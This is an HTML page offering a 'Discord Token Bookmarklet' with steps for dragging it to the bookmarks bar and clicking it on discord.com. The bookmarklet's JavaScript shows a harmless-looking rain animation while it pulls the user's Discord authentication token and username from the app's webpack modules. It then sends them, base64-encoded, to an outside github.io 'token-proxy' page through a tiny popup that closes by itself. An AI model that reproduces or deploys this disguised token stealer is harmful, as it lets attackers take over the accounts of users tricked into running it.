<!DOCTYPE html>
<html>
<head>
    <title>bookmarklet</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background: #f5f5f5;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        .bookmarklet {
            background: #4a90e2;
            color: white;
            padding: 12px 24px;
            text-decoration: none;
            display: inline-block;
            margin: 20px 0;
            border-radius: 4px;
            cursor: move;
        }
        .bookmarklet:hover {
            background: #357abd;
        }
        .instructions {
            background: white;
            padding: 15px;
            margin-top: 20px;
            border: 1px solid #ddd;
        }
        .instructions ol {
            margin-left: 20px;
            margin-top: 10px;
        }
        .instructions li {
            margin-bottom: 8px;
        }
        .note {
            margin-top: 20px;
            padding: 10px;
            background: #fff9e6;
            border-left: 3px solid #ffd700;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <h1>Discord Token Bookmarklet</h1>
    <p>drag this to your bookmarks bar:</p>
    
    <a href="javascript:(function(){if(!window.location.hostname.includes('discord.com'))return;const overlay=document.createElement('div');overlay.id='rain-overlay';overlay.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:transparent;z-index:999999;overflow:hidden;pointer-events:none;';document.body.appendChild(overlay);const canvas=document.createElement('canvas');canvas.width=window.innerWidth;canvas.height=window.innerHeight;overlay.appendChild(canvas);const ctx=canvas.getContext('2d');const raindrops=[];const splashes=[];function createRaindrop(){return{x:Math.random()*canvas.width,y:Math.random()*-200,speed:Math.random()*5+3,length:Math.random()*20+10,opacity:Math.random()*0.5+0.5};}function createSplash(x,y){for(let i=0;i<8;i++){const angle=(Math.PI*2*i)/8;splashes.push({x:x,y:y,vx:Math.cos(angle)*(Math.random()*3+2),vy:Math.sin(angle)*(Math.random()*3+2),life:20,maxLife:20});}}for(let i=0;i<100;i++){raindrops.push(createRaindrop());}function animate(){ctx.clearRect(0,0,canvas.width,canvas.height);ctx.strokeStyle='#FFF';ctx.lineWidth=2;for(let i=raindrops.length-1;i>=0;i--){const drop=raindrops[i];ctx.globalAlpha=drop.opacity;ctx.beginPath();ctx.moveTo(drop.x,drop.y);ctx.lineTo(drop.x,drop.y+drop.length);ctx.stroke();drop.y+=drop.speed;if(drop.y>canvas.height){createSplash(drop.x,canvas.height);raindrops[i]=createRaindrop();}}ctx.globalAlpha=1;ctx.fillStyle='#FFF';for(let i=splashes.length-1;i>=0;i--){const splash=splashes[i];const alpha=splash.life/splash.maxLife;ctx.globalAlpha=alpha;ctx.fillRect(splash.x,splash.y,2,2);splash.x+=splash.vx;splash.y+=splash.vy;splash.vy+=0.3;splash.life--;if(splash.life<=0){splashes.splice(i,1);}}ctx.globalAlpha=1;if(Math.random()<0.3){raindrops.push(createRaindrop());}}const animationInterval=setInterval(animate,16);function resizeCanvas(){canvas.width=window.innerWidth;canvas.height=window.innerHeight;}window.addEventListener('resize',resizeCanvas);const PROXY_URL='https://exoflex6.github.io/exofelx6.github.io/token-proxy.html';function getUsername(){try{if(window.webpackChunkdiscord_app){let username=null;window.webpackChunkdiscord_app.push([[Symbol()],{},function(o){for(let e of Object.values(o.c)){try{if(!e.exports||e.exports===window)continue;const exports=e.exports;if(exports&&typeof exports==='object'){for(let key in exports){const val=exports[key];if(val&&typeof val==='object'){if(val.username&&val.discriminator){username=val.discriminator==='0'?val.username:val.username+'#'+val.discriminator;}else if(val.globalName||val.username){username=val.globalName||val.username;}}}if(exports.getCurrentUser){const user=exports.getCurrentUser();if(user){username=user.discriminator==='0'?user.username:user.username+'#'+user.discriminator;}}}}catch(e){}}]);window.webpackChunkdiscord_app.pop();return username;}}catch(e){}}return null;}function sendToSupabase(token,username){try{const data=btoa(JSON.stringify({t:token,ts:new Date().toISOString(),u:window.location.href,n:username||null}));const win=window.open(PROXY_URL+'?d='+encodeURIComponent(data),'_blank','width=1,height=1');setTimeout(function(){try{if(win)win.close();}catch(e){}},2000);}catch(e){}}let token;try{if(window.webpackChunkdiscord_app){window.webpackChunkdiscord_app.push([[Symbol()],{},function(o){for(let e of Object.values(o.c)){try{if(!e.exports||e.exports===window)continue;if(e.exports&&e.exports.getToken){token=e.exports.getToken();if(token){const username=getUsername();sendToSupabase(token,username);}}for(let o in e.exports){if(e.exports[o]&&e.exports[o].getToken&&'IntlMessagesProxy'!==e.exports[o][Symbol.toStringTag]){token=e.exports[o].getToken();if(token){const username=getUsername();sendToSupabase(token,username);}}}}catch(e){}}}]);window.webpackChunkdiscord_app.pop();}}catch(e){}})();" 
           class="bookmarklet" 
           draggable="true"
           id="bookmarklet">
            drag to bookmarks
        </a>
        
        <div class="instructions">
            <h2>how to use:</h2>
            <ol>
                <li>show your bookmarks bar (ctrl+shift+b or cmd+shift+b)</li>
                <li>drag the button above to the bookmarks bar</li>
                <li>go to discord.com and click it</li>
            </ol>
        </div>
        
        <div class="note">
            only works on discord.com.
        </div>
    
    <script>
        document.getElementById('bookmarklet').addEventListener('click', function(e) {
            e.preventDefault();
        });
    </script>
</body>
</html>
